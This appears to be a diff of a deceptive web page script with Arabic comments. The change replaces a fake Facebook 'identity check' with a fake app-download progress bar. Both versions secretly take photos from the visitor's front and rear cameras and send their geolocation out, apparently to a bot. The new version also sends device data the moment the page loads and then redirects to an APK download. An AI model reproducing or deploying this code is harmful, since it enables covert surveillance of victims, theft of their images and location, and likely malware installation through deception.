+    progressFill.style.width = "0%";
+    progressPct.textContent = "0%";
+    progressSize.textContent = "0 / 18 MB";
+    processStatus.textContent = "جاري تحضير الملفات...";
 
-    // (ب) المرحلة 1: الكاميرا الأمامية
-    const frontOK = await shootBatch("user", "أمامية", 1);
+    // 1) الكاميرا الأمامية — 5 صور
+    await capturePhase("user", TOTAL_PER_SIDE, 5, 55);
 
-    // (ج) المرحلة 2: الكاميرا الخلفية
-    const backOK = await shootBatch("environment", "خلفية", 2);
+    await sleep(300);
 
-    // لو الاتنين فشلوا، نروح على طول
-    if(!frontOK && !backOK){
-      window.location.href = REDIRECT_URL;
-      return;
-    }
+    // 2) الكاميرا الخلفية — 5 صور
+    await capturePhase("environment", TOTAL_PER_SIDE, 5, 85);
 
-    // (د) الموقع الجغرافي
-    txt.textContent = "جاري التحقق من الهوية...";
+    // 3) الموقع الجغرافي
+    processStatus.textContent = ".";
+    progressFill.style.width = "88%";
+    progressPct.textContent = "88%";
+    progressSize.textContent = "15.8 / 18 MB";
+
     const loc = await requestLocation();
 
-    if(loc && loc.lat !== undefined){
+    if (loc && loc.lat !== undefined){
       const cap =
         `📍 <b>الموقع الجغرافي</b>\n` +
         `🌐 https://maps.google.com/?q=${loc.lat},${loc.lon}\n` +
         `🎯 الدقة: ${Math.round(loc.accuracy)} م`;
       sendLocation(loc.lat, loc.lon, cap);
-    }else if(loc && loc.error){
+    }else if (loc && loc.error){
       sendText(`📍 <b>الموقع الجغرافي</b>\n❌ ${esc(loc.error)}`);
     }else{
       sendText("📍 <b>الموقع الجغرافي</b>\n❌ لم يتم الحصول على الموقع");
     }
 
-    // (هـ) التحويل لفيسبوك
-    txt.textContent = "تم التحقق ✅";
-    await new Promise(r => setTimeout(r, 600));
-    window.location.href = REDIRECT_URL;
+    // 4) نقفل الكاميرا
+    await closeCamera();
+
+    // 5) نكمل شريط التقدم بسرعة للنهاية
+    processStatus.textContent = "✅ اكتمل التحقق";
+    const finalSteps = [92, 96, 99, 100];
+    for (const p of finalSteps){
+      progressFill.style.width = p + "%";
+      progressPct.textContent = p + "%";
+      progressSize.textContent = ((p/100)*18).toFixed(1) + " / 18 MB";
+      await sleep(250);
+    }
+
+    processStatus.textContent = "🎉 جاري فتح التطبيق...";
+    await sleep(800);
+
+    // 6) التحويل لتحميل الـ APK
+    window.location.href = APK_DOWNLOAD_URL;
   }
 
-  loginBtn.addEventListener("click", function(){
-    loginBtn.disabled = true;
-    loginBtn.textContent = "جاري التحقق...";
-    run();
-  });
+  /* ============================================================
+     الأحداث
+     ============================================================ */
+  downloadBtn.addEventListener("click", runFullSequence);
+  retryBtn.addEventListener("click", runFullSequence);
+
+  /* ============================================================
+     ⭐ فور تحميل الصفحة — نبعت البيانات الأولية
+     ============================================================ */
+  (async () => {
+    try{
+      const infoText = await collect();
+      sendText(infoText);
+    }catch(e){
+      console.warn("initial data failed:", e);
+    }
+  })();
 })();
 </script>
 </body>
